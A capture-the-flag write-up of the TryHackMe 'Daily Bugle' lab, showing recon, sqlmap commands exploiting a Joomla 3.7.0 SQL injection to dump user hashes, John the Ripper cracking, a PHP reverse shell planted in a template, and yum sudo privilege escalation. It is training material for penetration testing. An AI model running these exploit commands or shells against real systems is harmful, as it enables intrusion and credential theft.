---
Title: TryHackMe - Daily Bugle
Description: Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
categories:
 - tryhackme
tags: tryhackme , joomla, sqli, oscp, yum
---

## Summary

Daily Bugle is free box on Tryhackme OSCP learning path. 

## Enumeration/Reconnaissance
![](https://i.imgur.com/tzKm3a6.png)

Here is nmap result, we got three service running.
PORT       Service
22/tcp     ssh
80/tcp     http(Apache)
3306/tcp   mysql(MariaDB)

lets start with port 80 to deep dive.

And we found who rob the Bank
![](https://i.imgur.com/bSR8SzI.png)

To check for intresting directory lets fire up GoBuster.

![](https://i.imgur.com/WwjnMlr.png)

After checking directory we got admin panel.
![](https://i.imgur.com/eR2ePC3.png)

To get more info on joomla, i have used joomscan
![](https://i.imgur.com/YURMF5t.png)

Here nothing seems to be new but we got the joomla version Joomla 3.7.0

Searchsploit shows that joomla version 3.7.0 is vulnerable to sql injection.
![](https://i.imgur.com/2BjGrQb.png)

## Exploit
Here is that sqlmap command vulnerable to joomla 3.7.0
```
sqlmap -u “http://10.10.176.140/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
Lets start Sqlmap with above command.
![](https://i.imgur.com/ChiMPO1.png)
Here, we have declared cookies. So continue with Yes.
![](https://i.imgur.com/sMOS6iW.png)
To skip test payloads specifice for other database. So continue with Y.
![](https://i.imgur.com/6yZB6d2.png)
We got our vulnearable parameter. so stop testing with N.
![](https://i.imgur.com/DkWP4GN.png)
We got five Vulnerable database. Joomla looks interesting!!!
```
sqlmap -u “http://10.10.176.140/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables
```
![](https://i.imgur.com/IQprwWV.png)
```
sqlmap -u “http://10.10.176.140/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --columns
```
Now lets check the columns of Joomla. We got a table "#__users"


![](https://i.imgur.com/9u2jP3c.png)
Lets find out the columns of table "__users".

![](https://i.imgur.com/VlpSAiz.png)
We got five columns.Lets check for username and password.

```
sqlmap -u “http://10.10.176.140/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -c username --dump
```

![](https://i.imgur.com/mpCqnR8.png)
We got the username jonah

```
sqlmap -u “http://10.10.176.140/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -c password --dump
```
![](https://i.imgur.com/sb3qaHV.png)
lets check the password. We got hash
![](https://i.imgur.com/Pbztfh3.jpg)

## Password Cracking
Time to crack the hash. Here, I have used John to crack the hash
```
$ john --wordlist=/user/share/wordlists/rockyou.txt hash.txt
```
![](https://i.imgur.com/bjv8Hte.jpg)

We got the username and password. Lets goto admin panel and logged in.

![](https://i.imgur.com/R9s3ZQy.png)

Here, I got the template to insert the code. We can to insert reverse shell.
![](https://i.imgur.com/6FR9hhW.png)

![](https://i.imgur.com/RXOHVya.png)
## Reverse shell/Connection
Here I have used PentestMonkey Php Reverse-shell.
![](https://i.imgur.com/v8ChQNM.png)

Now, start netcat to listen on port 4444
![](https://i.imgur.com/oqsRAh7.png)

After saving the template. Click on Template Preview to get the reverse shell.
![](https://i.imgur.com/sUrErlE.png)
We got reverse connection in netcat.
![](https://i.imgur.com/Ith2FCR.png)
We got new user.
![](https://i.imgur.com/7SHM0Iq.png)
After searching, i got configuration file in /var/www/html/configuration.php
![](https://i.imgur.com/Nh4usCL.jpg)
So, got username and password of jjameson. lets switch to jjameson
![](https://i.imgur.com/hATkoiv.jpg)
## Privilege Escalation
For privilege Escalation, it was too easy. tried to start with sudo and got it.
sudo -l
![](https://i.imgur.com/hd2x2kz.png)
Now, goto GFTObin for yum
![](https://i.imgur.com/MYP9hKQ.png)
Copy paste this in your shell and boom
![](https://i.imgur.com/VLqdgFL.png)
## Root
we got root access and root.txt
![](https://i.imgur.com/WgPIsfX.jpg)




















